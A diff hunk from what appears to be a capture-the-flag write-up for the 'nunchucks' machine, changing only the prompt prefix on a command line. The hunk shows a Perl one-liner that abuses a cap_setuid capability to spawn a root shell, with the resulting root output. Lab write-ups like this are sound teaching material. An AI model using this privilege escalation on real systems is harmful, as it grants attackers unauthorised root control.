@@ -122,7 +122,7 @@ david@nunchucks:/$ getcap -r / 2>/dev/null
 perl has the `cap_setuid+ep` set, and there is an excellent article here `https://blog.1nf1n1ty.team/hacktricks/linux-hardening/privilege-escalation/docker-security/apparmor` that shows how to bypass apparmor to get a root shell. We can utilize a one liner and spawn a
 root shell:
 ```term
-david@nunchucks:/tmp$ echo -e '#!/usr/bin/perl\nuse POSIX qw(strftime);\nuse POSIX qw(setuid);\nPOSIX::setuid(0);\nexec "/bin/sh"' > /tmp/pwned.pl; chmod +x /tmp/pwned.pl; ./pwned.pl
+$ david@nunchucks:/tmp$ echo -e '#!/usr/bin/perl\nuse POSIX qw(strftime);\nuse POSIX qw(setuid);\nPOSIX::setuid(0);\nexec "/bin/sh"' > /tmp/pwned.pl; chmod +x /tmp/pwned.pl; ./pwned.pl
 # whoami
 root
 ```
